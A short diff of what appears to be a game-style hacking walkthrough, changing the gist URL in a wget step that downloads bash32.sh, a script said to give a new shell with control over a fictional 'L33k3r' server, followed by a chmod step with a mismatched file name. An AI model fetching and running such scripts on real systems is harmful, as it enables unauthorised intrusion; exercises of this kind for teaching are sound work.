@@ -84,7 +84,7 @@ The program is asking us a few questions, lets answer them by pressing the enter
 Next we are going to download some code made by Alice and Bob that will help us infiltrate the L33k3r server. 
 
 The code below is a script we will run which will create a completely new Bash Terminal that will have control over their server!
-- `wget https://gist.githubusercontent.com/AndyNovo/217341c2818dc569294c86ffafc0ef9b/raw/530536eb4dd081869651f85d1c4ca04f8183b0c7/bash32.sh`
+- `wget https://gist.githubusercontent.com/AndyNovo/ce5ff5a1d4376343787c31332578e831/raw/f13ab425f4f338323eb7c1e8652aa04c7ad0ecb4/bash32.sh`
 
 The command below will give the file we just downloaded exectuable permission.
 - `chmod +x bash32.ch`
